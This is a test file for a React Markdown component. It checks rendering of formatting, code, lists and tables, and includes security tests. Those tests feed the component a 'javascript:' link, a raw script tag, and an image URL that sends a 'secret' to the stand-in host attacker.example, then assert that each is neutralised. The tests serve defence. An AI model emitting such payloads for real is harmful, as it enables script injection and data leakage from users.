import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { Markdown } from './Markdown'

describe('Markdown', () => {
  it('renders headings, bold and italic text instead of showing the markup characters', () => {
    const { container } = render(<Markdown>{'# Title\n\n## Sub\n\nSome **bold** and *italic* text'}</Markdown>)

    expect(screen.getByRole('heading', { level: 1, name: 'Title' })).toBeInTheDocument()
    expect(screen.getByRole('heading', { level: 2, name: 'Sub' })).toBeInTheDocument()
    expect(screen.getByText('bold').tagName).toBe('STRONG')
    expect(screen.getByText('italic').tagName).toBe('EM')
    expect(container.textContent).not.toContain('**')
    expect(container.textContent).not.toContain('#')
  })

  it('renders inline code and fenced code blocks without the backticks', () => {
    const { container } = render(<Markdown>{'Use `read_text_file`:\n\n```\n# Sample note\n\nbody\n```'}</Markdown>)

    expect(screen.getByText('read_text_file').tagName).toBe('CODE')
    const block = container.querySelector('pre code')
    expect(block).toHaveTextContent('# Sample note')
    expect(container.textContent).not.toContain('`')
  })

  it('renders lists and GitHub-style tables', () => {
    render(<Markdown>{'- one\n- two\n\n1. first\n2. second\n\n| name | size |\n|---|---|\n| a.md | 12 |'}</Markdown>)

    expect(screen.getAllByRole('listitem')).toHaveLength(4)
    expect(screen.getByRole('table')).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: 'size' })).toBeInTheDocument()
    expect(screen.getByRole('cell', { name: 'a.md' })).toBeInTheDocument()
  })

  it('opens links in a new tab without leaking the opener', () => {
    render(<Markdown>{'[docs](https://example.com/page)'}</Markdown>)

    const link = screen.getByRole('link', { name: 'docs' })
    expect(link).toHaveAttribute('href', 'https://example.com/page')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('does not produce a clickable javascript: link', () => {
    render(<Markdown>{'[click](javascript:alert(1))'}</Markdown>)

    expect(screen.getByText('click').getAttribute('href') ?? '').not.toMatch(/^javascript:/i)
  })

  it('shows raw HTML as inert text instead of rendering it', () => {
    const { container } = render(<Markdown>{'<script>window.x = 1</script><b>not bold</b>'}</Markdown>)

    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('b')).toBeNull()
  })

  it('does not load images, showing the alt text instead', () => {
    const { container } = render(<Markdown>{'![a chart](https://attacker.example/leak.png?d=secret)'}</Markdown>)

    expect(container.querySelector('img')).toBeNull()
    expect(container).toHaveTextContent('a chart')
  })

  it('copes with half-streamed markdown', () => {
    const { container } = render(<Markdown>{'**bold that is not closed and ```code'}</Markdown>)

    expect(container).toHaveTextContent('bold that is not closed')
  })
})
